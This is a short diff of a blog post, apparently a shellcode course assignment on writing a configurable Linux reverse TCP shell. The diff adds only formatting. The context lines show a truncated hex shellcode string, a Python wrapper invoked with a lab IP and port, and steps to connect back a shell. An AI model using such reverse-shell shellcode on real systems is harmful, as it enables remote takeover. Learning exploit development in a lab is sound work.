@@ -10,6 +10,7 @@ The second assigment is to create Reverse TCP Shellcode which does following.
 - Execs a shell upon connection
 - The IP address  and port number are configurable
 
+<!-- more -->
 
 So, our approach to writing assembly code for this challenge is as follows:
 1. Create a socket with SYS_SOCKET
@@ -419,12 +420,16 @@ shellcode = (r"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\
 print '"'+shellcode+'"\n'
 ```
 Lets look at ip address of another machine on my network.
+
 ![Another Machine on Network](/assets/asn-2-another-machine-ip.PNG)
+
 Run the python wrapper script with the ip address and desired port as arguments.
 ```
 python ip-port-config-shell-reverse-tcp.py 192.168.56.102 6767
 ```
 ![Python Wrapper IP and Port](/assets/asn-2-ip-port-config-script.PNG)
+
 Once again insert the shellcode in ```shellcode.c``` then compile the file. Now its time to test our reverse shell once again.
+
 ![Reverse Shell Network Machine](/assets/asn-2-connect-back-network-machine.PNG)
 
